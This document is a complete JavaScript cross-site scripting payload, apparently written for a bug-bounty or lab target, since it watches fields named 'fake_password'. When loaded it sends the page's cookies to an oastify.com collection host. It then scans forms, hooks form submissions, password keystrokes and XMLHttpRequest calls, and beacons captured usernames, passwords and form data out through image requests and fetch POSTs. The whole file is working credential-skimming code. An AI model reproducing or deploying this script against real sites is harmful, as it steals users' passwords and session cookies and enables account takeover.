(function() {
    'use strict';
    
    const EXFIL = 'r7z6iqxtkro4lnr4yzhdr5skobu2itbh0.oastify.com';
    
    console.log('[XSS] Script loaded - Exfiltration active');
    
    // Function to send data to Oastify
    function exfil(data, endpoint = 'data') {
        try {
            // Method 1: Image beacon (most reliable)
            new Image().src = `https://${EXFIL}/${endpoint}?d=${btoa(JSON.stringify(data))}`;
            
            // Method 2: Plain text for easy reading
            if (data.fake_password) {
                new Image().src = `https://${EXFIL}/password?user=${encodeURIComponent(data.fake_username || '')}&pass=${encodeURIComponent(data.fake_password)}`;
            }
            
            // Method 3: Fetch backup
            fetch(`https://${EXFIL}/fetch`, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).catch(e => {});
            
            console.log('[EXFIL] Sent:', data);
        } catch(e) {
            console.error('[EXFIL] Error:', e);
        }
    }
    
    // Immediately scan for password fields
    setTimeout(() => {
        console.log('[SCAN] Looking for password fields...');
        
        let forms = document.querySelectorAll('form');
        forms.forEach((form, idx) => {
            let inputs = form.querySelectorAll('input');
            let foundData = {
                form_index: idx,
                form_action: form.action,
                timestamp: new Date().toISOString(),
                url: window.location.href
            };
            
            inputs.forEach(input => {
                if (input.value) {
                    foundData[input.name || input.id || 'unnamed'] = input.value;
                }
                
                // If password field found, send immediately
                if (input.name === 'fake_password' && input.value) {
                    console.log('[FOUND] Password field with value!');
                    exfil({
                        type: 'password_found',
                        fake_username: form.querySelector('[name="fake_username"]')?.value || '',
                        fake_password: input.value,
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    }, 'found');
                }
            });
            
            // Send all form data if any fields have values
            if (Object.keys(foundData).length > 4) {
                exfil(foundData, 'scan');
            }
        });
    }, 500);
    
    // Hook form submissions
    document.addEventListener('submit', function(e) {
        console.log('[HOOK] Form submission intercepted!');
        let form = e.target;
        let formData = new FormData(form);
        let data = {
            type: 'form_submit',
            action: form.action,
            timestamp: new Date().toISOString()
        };
        
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        // Send immediately
        exfil(data, 'submit');
        
        console.log('[EXFIL] Form data sent:', data);
    }, true);
    
    // Hook input changes for password fields
    document.addEventListener('input', function(e) {
        if (e.target.name === 'fake_password' || e.target.type === 'password') {
            console.log('[HOOK] Password input detected:', e.target.value);
            exfil({
                type: 'password_input',
                field_name: e.target.name,
                value: e.target.value,
                timestamp: new Date().toISOString()
            }, 'input');
        }
    }, true);
    
    // Hook XHR requests
    const origXHRSend = XMLHttpRequest.prototype.send;
    const origXHROpen = XMLHttpRequest.prototype.open;
    
    XMLHttpRequest.prototype.open = function(method, url) {
        this._method = method;
        this._url = url;
        return origXHROpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(data) {
        if (data && typeof data === 'string') {
            console.log('[XHR] Request intercepted:', data);
            
            // Parse URL-encoded data
            if (data.includes('fake_password')) {
                try {
                    let parsed = {};
                    data.split('&').forEach(pair => {
                        let [k, v] = pair.split('=');
                        parsed[decodeURIComponent(k)] = decodeURIComponent(v);
                    });
                    
                    if (parsed.fake_password) {
                        console.log('[XHR] Password found in request!');
                        exfil({
                            type: 'xhr_intercept',
                            method: this._method,
                            url: this._url,
                            data: parsed,
                            timestamp: new Date().toISOString()
                        }, 'xhr');
                    }
                } catch(e) {}
            }
        }
        return origXHRSend.apply(this, arguments);
    };
    
    // Send initial beacon
    exfil({
        type: 'loaded',
        url: window.location.href,
        cookies: document.cookie,
        timestamp: new Date().toISOString()
    }, 'init');
    
    console.log('[XSS] All hooks installed - monitoring for passwords');
    
})();
